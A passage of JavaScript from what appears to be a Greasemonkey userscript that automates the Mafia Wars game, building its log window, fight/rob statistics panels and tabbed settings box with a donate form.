  var mafiaLogBox = makeElement('div', document.body, {'id':'mafiaLogBox'});

  // This creates the log 'table' - first row - borders
  eltRow = makeElement('ul', mafiaLogBox, {'style':'height:15px;'});
  eltCol = makeElement('li', eltRow, {'style':'width:18px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r1_c1.png','style':'width:18px;height:15px;'});
  eltCol = makeElement('li', eltRow, {'style':'width:460px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r1_c2.png','style':'width:460px;height:15px;'});
  eltCol = makeElement('li', eltRow, {'style':'width:20px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r1_c16.png','style':'width:20px;height:15px;'});

  // This creates the log 'table' - second row - menu header
  eltRow = makeElement('ul', mafiaLogBox, {'style':'height:30px;'});
  eltCol = makeElement('li', eltRow, {'style':'width:18px;height:31px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/left_corner.png','style':'width:18px;height:31px;'});

  //pause / resume
  eltCol = makeElement('li', eltRow,{'style':'width:46px;height:30px;background-image:url(\'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/placeholder.png\');'});
  eltCol.addEventListener('click', mwapOnOff, false);
  eltA = makeElement('a', eltCol, {'href':'#','class':'pauseLink','alt':'pause','title':'pause','id':'pauseLink','style':(running ? 'display:block;' : 'display:none;')});
  eltA = makeElement('a', eltCol, {'href':'#','class':'resumeLink','alt':'resume','title':'resume','id':'resumeLink','style':(running ? 'display:none;' : 'display:block;')});
  //clear log
  eltCol = makeElement('li', eltRow);
  eltCol.addEventListener('click', clearLog, false);
  eltA = makeElement('a', eltCol, {'href':'#','class':'clearLogLink','alt':'clear log','title':'clear log'});
  //clear stats
  eltCol = makeElement('li', eltRow);
  eltCol.addEventListener('click', clearStats, false);
  eltA = makeElement('a', eltCol, {'href':'#','class':'clearStatsLink','alt':'clear stats','title':'clear stats'});
  //settings
  eltCol = makeElement('li', eltRow);
  eltCol.addEventListener('click', toggleSettings, false);
  eltA = makeElement('a', eltCol, {'href':'#','class':'toggleSettingsLink','alt':'settings','title':'settings'});
  //filter
  eltCol = makeElement('li', eltRow);
  eltCol.addEventListener('click', logFilterOnOff, false);
  eltA = makeElement('a', eltCol, {'href':'#','id':'filterOn','class':'filterActiveLink','alt':'filter off','title':'filter off','style':(filter ? 'display:block;' : 'display:none;')});
  eltA = makeElement('a', eltCol, {'href':'#','id':'filterOff','class':'filterNotActiveLink','alt':'filter on','title':'filter on','style':(filter ? 'display:none;' : 'display:block;')});
  //debug
  eltCol = makeElement('li', eltRow);
  eltCol.addEventListener('click', debugOnOff, false);
  eltA = makeElement('a', eltCol, {'href':'#','id':'debugOn','class':'debugActiveLink','alt':'debug off','title':'debug off','style':(debug ? 'display:block;' : 'display:none;')});
  eltA = makeElement('a', eltCol, {'href':'#','id':'debugOff','class':'debugNotActiveLink','alt':'debug on','title':'debug on','style':(debug ? 'display:none;' : 'display:block;')});
  //placeholder
  eltCol = makeElement('li', eltRow,{'style':'width:40px;height:30px;background-image:url(\'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/placeholder.png\');'});
  //close
  eltCol = makeElement('li', eltRow);
  eltCol.addEventListener('click', hideMafiaLogBox, false);
  eltA = makeElement('a', eltCol, {'href':'#','class':'closeLink','alt':'close','title':'close'});

  eltCol = makeElement('li', eltRow, {'style':'width:20px;height:31px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/right_corner.png','style':'width:20px;height:31px;'});
  eltRow = makeElement('ul', mafiaLogBox);

  eltCol = makeElement('li', eltRow, {'style':'width:479px;padding: 0px;margin:0px;border-left:3px solid #B70B0B;border-right:3px solid #B70B0B;float:left;position: absolute; right: 0px; top: 45px; bottom: 15px; margin-left:0px;margin-right:8px;'});
  var logContainer = makeElement('div', eltCol, {'id':'logContainer', 'style':'float:left;position: absolute; left: 0px; top: 0px; bottom: 75px; width: 479px; background-color: #000000; font-size:11px; color: #BCD2EA; text-align:left;border-bottom:2px solid #B70B0B;'});
  var logBox = makeElement('div', logContainer, {'id':'logBox', 'style':'float:left;position: absolute; overflow: auto; overflow-x: hidden;left: 0px; top: 0px; bottom: 0px; width: 465px;padding:5px;margin-bottom:5px;background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_15.png\');background-position:center top;'});
  logBox.innerHTML = GM_getValue('itemLog', '');

  // stat tabs....
  var statPrimaryElt = makeElement('div', mafiaLogBox, {'id': 'statPrimary', 'style':'display: block;'});
  var statPassiveElt = makeElement('div', mafiaLogBox, {'id': 'statPassive', 'style':'display: none;'});

  // tab buttons
  var statPrimaryButton = makeElement('div', mafiaLogBox, {'id': 'btnPrimaryStat', 'class':'mouseunderline', 'style':'position: absolute; left: 10px; bottom: 76px; font-weight: 600; cursor: pointer; color: rgb(0, 255, 0);'});
  statPrimaryButton.appendChild(document.createTextNode('primary'));
  statPrimaryButton.addEventListener('click', showPrimaryStats, false);

  var statPassiveButton = makeElement('div', mafiaLogBox, {'id': 'btnPassiveStat', 'class':'mouseunderline', 'style':'position: absolute; left: 90px; bottom: 76px; font-weight: 600; cursor: pointer; color: rgb(0, 128, 0);'});
  statPassiveButton.appendChild(document.createTextNode('passive'));
  statPassiveButton.addEventListener('click', showPassiveStats, false);

  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 15px; bottom: 65px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Exp Gained:'));
  makeElement('div', statPassiveElt, {'id':'passivetotalExp', 'style':'position: absolute; right: 325px; bottom: 65px; font-size: 10px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivetotalFightExpInt', 0) + GM_getValue('passivetotalJobExpInt', 0))));
  makeElement('div', statPassiveElt, {'style':'position: absolute; right: 262px; bottom: 65px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Fights:'));
  makeElement('div', statPassiveElt, {'id':'passivetotalFightExp', 'style':'position: absolute; right: 225px; bottom: 65px; font-size: 10px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivetotalFightExpInt', 0))));
  makeElement('div', statPassiveElt, {'style':'position: absolute; right: 175px; bottom: 65px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Jobs:'));
  makeElement('div', statPassiveElt, {'id':'passivetotalJobExp', 'style':'position: absolute; right: 135px; bottom: 65px; font-size: 10px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivetotalJobExpInt', 0))));

  makeElement('hr', statPassiveElt, {'style':'position: absolute; left: 0; bottom: 57px; height: 1px; border: 0px; width: 475px; margin-left:10px; color: #666666; background-color: #666666'});

  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 15px; bottom: 48px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Attacks:'));
  makeElement('div', statPassiveElt, {'id':'passivefightCount', 'style':'position: absolute; right: 360px; bottom: 48px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0))));

  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 15px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Won:'));
  makeElement('div', statPassiveElt, {'id':'passivefightWinCount', 'style':'position: absolute; right: 360px; bottom: 33px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivefightWinCountInt', 0))));
  var passivefightWinPct = (GM_getValue('passivefightWinCountInt', 0)/(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPassiveElt, {'id':'passivefightWinPct', 'style':'position: absolute; right: 325px; bottom: 33px; font-size: 10px; font-weight: 100;color: #52E259;'}).appendChild(document.createTextNode((isNaN(passivefightWinPct)) ? '0.0%' : passivefightWinPct + '%'));
  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 15px; bottom: 18px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Lost:'));
  makeElement('div', statPassiveElt, {'id':'passivefightLossCount', 'style':'position: absolute; right: 360px; bottom: 18px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('passivefightLossCountInt', 0))));
  var passivefightLossPct = (GM_getValue('passivefightLossCountInt', 0)/(GM_getValue('passivefightWinCountInt', 0) + GM_getValue('passivefightLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPassiveElt, {'id':'passivefightLossPct', 'style':'position: absolute; right: 325px; bottom: 18px; font-size: 10px; font-weight: 100;color: #EC2D2D;'}).appendChild(document.createTextNode((isNaN(passivefightLossPct)) ? '0.0%' : passivefightLossPct + '%'));

  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 190px; bottom: 48px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('HitListed:'));
  makeElement('div', statPassiveElt, {'id':'whackedCount', 'style':'position: absolute; right: 220px; bottom: 48px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(GM_getValue('whackedCount', 0)));
  makeElement('div', statPassiveElt, {'style':'position: absolute; left: 190px; bottom: 33px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Snuffed:'));
  makeElement('div', statPassiveElt, {'id':'snuffCount', 'style':'position: absolute; right: 220px; bottom: 33px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(GM_getValue('snuffCount', 0)));

  makeElement('div', statPassiveElt, {'style':'position: absolute; right: 15px; bottom: 48px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Total $ Won/Lost'));
  var winDollars = parseInt(GM_getValue('passivefightWin$NY', 0)) + parseInt(GM_getValue('passivefightWin$Cuba', 0)) + parseInt(GM_getValue('passivefightWin$Moscow', 0)) + parseInt(GM_getValue('passivefightWin$Bangkok', 0)) + parseInt(GM_getValue('passivefightWin$Vegas', 0));
  var lossDollars = parseInt(GM_getValue('passivefightLoss$NY', 0)) + parseInt(GM_getValue('passivefightLoss$Cuba', 0)) + parseInt(GM_getValue('passivefightLoss$Moscow', 0)) + parseInt(GM_getValue('passivefightLoss$Bangkok', 0)) + parseInt(GM_getValue('passivefightLoss$Vegas', 0));
  var titlePassiveWinDollars = '$' + makeCommaValue(GM_getValue('passivefightWin$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('passivefightWin$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('passivefightWin$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('passivefightWin$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('passivefightWin$Vegas', 0));
  var titlePassiveLossDollars = '$' + makeCommaValue(GM_getValue('passivefightLoss$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('passivefightLoss$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('passivefightLoss$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('passivefightLoss$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('passivefightLoss$Vegas', 0));
  makeElement('div', statPassiveElt, {'id':'totalPassiveWinDollars', 'title':titlePassiveWinDollars, 'style':'position: absolute; right: 15px; bottom: 33px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode( getDollarsUnit(winDollars) )); //Accomodates up to $999,999,999,999
  makeElement('div', statPassiveElt, {'id':'totalPassiveLossDollars', 'title':titlePassiveLossDollars, 'style':'position: absolute; right: 15px; bottom: 18px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode( getDollarsUnit(lossDollars) ));

  //Change Stats Displayed based on current stamina burner
  //fight Stats are currently default for leftmost portion of Stats
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 15px; bottom: 43px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Fights:'));
  makeElement('div', statPrimaryElt, {'id':'fightCount', 'style':'position: absolute; right: 380px; bottom: 43px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0))));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 15px; bottom: 28px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Won:'));
  makeElement('div', statPrimaryElt, {'id':'fightWinCount', 'style':'position: absolute; right: 380px; bottom: 28px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('fightWinCountInt', 0))));
  var fightWinPct = (GM_getValue('fightWinCountInt', 0)/(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'fightWinPct', 'style':'position: absolute; right: 345px; bottom: 28px; font-size: 10px; font-weight: 100;color: #52E259;'}).appendChild(document.createTextNode((isNaN(fightWinPct)) ? '0.0%' : fightWinPct + '%'));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 15px; bottom: 13px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Lost:'));
  makeElement('div', statPrimaryElt, {'id':'fightLossCount', 'style':'position: absolute; right: 380px; bottom: 13px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('fightLossCountInt', 0))));
  var fightLossPct = (GM_getValue('fightLossCountInt', 0)/(GM_getValue('fightWinCountInt', 0) + GM_getValue('fightLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'fightLossPct', 'style':'position: absolute; right: 345px; bottom: 13px; font-size: 10px; font-weight: 100;color: #EC2D2D;'}).appendChild(document.createTextNode((isNaN(fightLossPct)) ? '0.0%' : fightLossPct + '%'));

  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 170px; bottom: 43px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Hits:'));
  makeElement('div', statPrimaryElt, {'id':'hitmanCount', 'style':'position: absolute; right: 260px; bottom: 43px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(makeCommaValue((GM_getValue('hitmanWinCountInt', 0) + GM_getValue('hitmanLossCountInt', 0)))));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 170px; bottom: 28px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Succ:'));
  makeElement('div', statPrimaryElt, {'id':'hitmanWinCount', 'style':'position: absolute; right: 260px; bottom: 28px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('hitmanWinCountInt', 0))));
  var hitmanWinPct = (GM_getValue('hitmanWinCountInt', 0)/(GM_getValue('hitmanWinCountInt', 0) + GM_getValue('hitmanLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'hitmanWinPct', 'style':'position: absolute; right: 225px; bottom: 28px; font-size: 10px; font-weight: 100;color: #52E259;'}).appendChild(document.createTextNode((isNaN(hitmanWinPct)) ? '0.0%' : hitmanWinPct + '%'));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 170px; bottom: 13px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Fail:'));
  makeElement('div', statPrimaryElt, {'id':'hitmanLossCount', 'style':'position: absolute; right: 260px; bottom: 13px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('hitmanLossCountInt', 0))));
  var hitmanLossPct = (GM_getValue('hitmanLossCountInt', 0)/(GM_getValue('hitmanWinCountInt', 1) + GM_getValue('hitmanLossCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'hitmanLossPct', 'style':'position: absolute; right: 225px; bottom: 13px; font-size: 10px; font-weight: 100;color: #EC2D2D;'}).appendChild(document.createTextNode((isNaN(hitmanLossPct)) ? '0.0%' : hitmanLossPct + '%'));

  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 280px; bottom: 43px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Robs:'));
  makeElement('div', statPrimaryElt, {'id':'robCount', 'style':'position: absolute; right: 135px; bottom: 43px; font-weight: 600;color: #BCD2EA;'}).appendChild(document.createTextNode(makeCommaValue((GM_getValue('robSuccessCountInt', 0) + GM_getValue('robFailedCountInt', 0)))));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 280px; bottom: 28px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Succ:'));
  makeElement('div', statPrimaryElt, {'id':'robWinCount', 'style':'position: absolute; right: 135px; bottom: 28px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('robSuccessCountInt', 0))));
  var robWinPct = (GM_getValue('robSuccessCountInt', 0)/(GM_getValue('robSuccessCountInt', 0) + GM_getValue('robFailedCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'robWinPct', 'style':'position: absolute; right: 100px; bottom: 28px; font-size: 10px; font-weight: 100;color: #52E259;'}).appendChild(document.createTextNode((isNaN(robWinPct)) ? '0.0%' : robWinPct + '%'));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 280px; bottom: 13px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Fail:'));
  makeElement('div', statPrimaryElt, {'id':'robLossCount', 'style':'position: absolute; right: 135px; bottom: 13px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('robFailedCountInt', 0))));
  var robLossPct = (GM_getValue('robFailedCountInt', 0)/(GM_getValue('robSuccessCountInt', 1) + GM_getValue('robFailedCountInt', 0)) * 100).toFixed(1);
  makeElement('div', statPrimaryElt, {'id':'robLossPct', 'style':'position: absolute; right: 100px; bottom: 13px; font-size: 10px; font-weight: 100;color: #EC2D2D;'}).appendChild(document.createTextNode((isNaN(robLossPct)) ? '0.0%' : robLossPct + '%'));

  makeElement('div', statPrimaryElt, {'style':'position: absolute; right: 15px; bottom: 43px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Total $ Won/Lost'));
  var titleWinDollars = '$' + makeCommaValue(GM_getValue('fightWin$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('fightWin$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('fightWin$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('fightWin$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('fightWin$Vegas', 0));
  var titleLossDollars = '$' + makeCommaValue(GM_getValue('fightLoss$NY', 0)) + ' | C$' + makeCommaValue(GM_getValue('fightLoss$Cuba', 0)) + ' | M$' + makeCommaValue(GM_getValue('fightLoss$Moscow', 0)) + ' | B$' + makeCommaValue(GM_getValue('fightLoss$Bangkok', 0)) + ' | V$' + makeCommaValue(GM_getValue('fightLoss$Vegas', 0));
  makeElement('div', statPrimaryElt, {'id':'totalWinDollars', 'title':titleWinDollars, 'style':'position: absolute; right: 15px; bottom: 28px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode( getDollarsUnit(parseInt(GM_getValue('totalWinDollarsInt', 0))) )); //Accomodates up to $999,999,999,999
  makeElement('div', statPrimaryElt, {'id':'totalLossDollars', 'title':titleLossDollars, 'style':'position: absolute; right: 15px; bottom: 13px; font-weight: 600;color: #EC2D2D;'}).appendChild(document.createTextNode( getDollarsUnit(parseInt(GM_getValue('totalLossDollarsInt', 0))) ));

  makeElement('div', statPrimaryElt, {'style':'position: absolute; left: 15px; bottom: 65px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Exp Gained:'));
  makeElement('div', statPrimaryElt, {'id':'totalExp', 'style':'position: absolute; right: 369px; bottom: 65px; font-size: 10px; font-weight: 600;color: #52E259;'}).appendChild(document.createTextNode(makeCommaValue(GM_getValue('totalExpInt', 0))));

  makeElement('hr', statPrimaryElt, {'style':'position: absolute; left: 0; bottom: 57px; height: 1px; border: 0px; width: 475px; margin-left:10px; color: #666666; background-color: #666666'});

  makeElement('div', statPrimaryElt, {'style':'position: absolute; right: 287px; bottom: 65px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Gain Rate:'));

  var rate = getStaminaGainRate();
  makeElement('div', statPrimaryElt, {'id':'expRate', 'style':'position: absolute; right: 260px; bottom: 65px; font-size: 10px; font-weight: 600;color: #04B4AE;'}).appendChild(document.createTextNode(rate.toFixed(2)));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; right: 195px; bottom: 65px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Nxt Lvl In:'));
  makeElement('div', statPrimaryElt, {'id':'expToNext', 'style':'position: absolute; right: 161px; bottom: 65px; font-size: 10px; font-weight: 600;color: #04B4AE;'}).appendChild(document.createTextNode(makeCommaValue(ptsToNextLevel)));
  makeElement('div', statPrimaryElt, {'style':'position: absolute; right: 56px; bottom: 65px; font-size: 10px; font-weight: 100;color: #666666;'}).appendChild(document.createTextNode('Stam Req\'d to Lvl:'));
  makeElement('div', statPrimaryElt, {'id':'stamToNext', 'style':'position: absolute; right: 22px; bottom: 65px; font-size: 10px; font-weight: 600;color: #04B4AE;'}).appendChild(document.createTextNode(rate? (ptsToNextLevel / rate).toFixed(0) : 'n/a'));

  eltRow = makeElement('ul', mafiaLogBox, {'style':'height:15px;position: absolute; overflow: auto; right: 0px; bottom: 0px;overflow:none;margin:0px;padding:0px;'});
  eltCol = makeElement('li', eltRow, {'style':'width:18px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r6_c1.png','style':'width:18px;height:15px;'});
  eltCol = makeElement('li', eltRow, {'style':'width:460px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r6_c2.png','style':'width:460px;height:15px;'});
  eltCol = makeElement('li', eltRow, {'style':'width:20px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r6_c16.png','style':'width:20px;height:15px;'});
}

function getDollarsUnit(amount) {
  var units = ['', 'K', 'M', 'G', 'T'];
  var dollarUnit = 0;
  while (amount > 1000) {
    amount /= 1000;
    dollarUnit++;
  }
  return units[dollarUnit] + '$' + amount.toFixed(3);
}

function createSettingsBox() {
  if (document.getElementById('MWAPSettingsBox')) return;

  // This creates the settings box
  var MWAPSettingsBox = makeElement('div', document.body, {'id':'MWAPSettingsBox'});

  // This creates the settings 'table' - first row - borders
  eltRow = makeElement('ul', MWAPSettingsBox, {'style':'height:15px;'});
  // Top Left Corner
  eltCol = makeElement('li', eltRow, {'style':'width:18px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r1_c1.png','style':'width:18px;height:15px;'});
  // Top Border
  eltCol = makeElement('li', eltRow, {'style':'width:762px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r1_c2.png','style':'width:762px;height:15px;'});
  // Top Right Border
  eltCol = makeElement('li', eltRow, {'style':'width:20px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r1_c16.png','style':'width:20px;height:15px;'});

  // This creates the settings 'table' - second row - menu header
  eltRow = makeElement('ul', MWAPSettingsBox, {'id':'tabNav','style':'height:31px;'});
  // Top Left Border

  eltCol = makeElement('li', eltRow, {'style':'width:18px;height:31px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r2_c1.png','style':'width:18px;height:31px;'});
  // General Tab
  eltCol = makeElement('li', eltRow, {'class':'selected','id':'General_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'generalTab','class':'generalLink','alt':'general','title':'general'});
  // Display
  eltCol = makeElement('li', eltRow, {'id':'Display_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'displayTab','class':'displayLink','alt':'display','title':'display'});
  // Mafia
  eltCol = makeElement('li', eltRow, {'id':'Mafia_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'mafiaTab','class':'mafiaLink','alt':'mafia','title':'mafia'});
  // Missions
  eltCol = makeElement('li', eltRow, {'id':'Help_Missions_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'HelpMissionsTab','class':'helpmissionsLink','alt':'missions','title':'missions'});
  // Auto-Stat
  eltCol = makeElement('li', eltRow, {'id':'Autostat_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'autostatTab','class':'autostatLink','alt':'autostat','title':'autostat'});
  // Energy
  eltCol = makeElement('li', eltRow, {'id':'Energy_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'energyTab','class':'energyLink','alt':'energy','title':'energy'});
  //Stamina
  eltCol = makeElement('li', eltRow, {'id':'Stamina_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'staminaTab','class':'staminaLink','alt':'stamina','title':'stamina'});
  // Health
  eltCol = makeElement('li', eltRow, {'id':'Heal_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'healTab','class':'healLink','alt':'heal','title':'heal'});
  // Cash
  eltCol = makeElement('li', eltRow, {'id':'Cash_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'cashTab','class':'cashLink','alt':'cash','title':'cash'});
  // About
  eltCol = makeElement('li', eltRow, {'id':'About_Tab'});
  eltA = makeElement('a', eltCol, {'href':'#','rel':'aboutTab','class':'aboutLink','alt':'about','title':'about'});
  // Close
  eltCol = makeElement('li', eltRow);
  eltCol.addEventListener('click', toggleSettings, false);
  eltA = makeElement('a', eltCol, {'href':'#','class':'closeLink','alt':'close','title':'close'});

  // Top Right Border
  eltCol = makeElement('li', eltRow, {'style':'width:20px;height:31px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r2_c16.png','style':'width:20px;height:31px;'});

  // This creates the settings 'table' - third row - body header
  eltRow = makeElement('ul', MWAPSettingsBox, {'style':'height:464px;'});
  // Left Border
  eltCol = makeElement('li', eltRow, {'style':'display:inline;list-style-type:none;float:left;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r3_c1.png','style':'width:18px;height:464px;float:left;'});

  //Begin Actual content
  var settingsBox = makeElement('div', eltCol, {'id':'settingsBox'});

  // Create General tab.
  var generalTab = createGeneralTab();
  settingsBox.appendChild(generalTab);

  // Create Display tab.
  var displayTab = createDisplayTab();
  settingsBox.appendChild(displayTab);

  // Create Mafia tab.
  var mafiaTab = createMafiaTab();
  settingsBox.appendChild(mafiaTab);

  // Create help/publish tab.
  var HelpMissionsTab = createHelpMissionsTab();
  settingsBox.appendChild(HelpMissionsTab);

  // Create Autostat tab.
  var autostatTab = createAutostatTab();
  settingsBox.appendChild(autostatTab);

  // Create energy tab.
  var energyTab = createEnergyTab();
  settingsBox.appendChild(energyTab);

  // Create stamina tab.
  var staminaTab = createStaminaTab();
  settingsBox.appendChild(staminaTab);

  // Create health tab.
  var healTab = createHealTab();
  settingsBox.appendChild(healTab);

  // Create cash tab.
  var cashTab = createCashTab();
  settingsBox.appendChild(cashTab);

  // Create about tab.
  var aboutTab = createAboutTab();
  settingsBox.appendChild(aboutTab);

  //End Actual content

  eltCol = makeElement('li', eltRow, {'style':'float:none;clear:both;width:20px;height:464px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r3_c16.png','style':'width:20px;height:464px;'});

  // This creates the settings 'table' - fourth row - buttons
  eltRow = makeElement('ul', MWAPSettingsBox, {'style':'height:70px;'});

  eltCol = makeElement('li', eltRow, {'style':'width:18px;height:70px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r5_c1.png','style':'width:18px;height:70px;'});

  // PS MWAP Link
  eltCol = makeElement('li', eltRow);
  eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com','target':'_blank','class':'mwapLink','alt':'playerscripts.com','title':'playerscripts.com'});
  eltCol = makeElement('li', eltRow, {'style':'width:147px;height:70px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r5_c4.png','style':'width:147px;height:70px;'});

  // PS MWAPDonate button pointing at PayPal site
  eltCol = makeElement('li', eltRow);
  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateForm','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','class':'donateButton','onclick':'document.MWAPDonateForm.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.'});

  //PS MWAP Update button
  if (gvar.isGreaseMonkey) {
    eltCol = makeElement('li', eltRow);
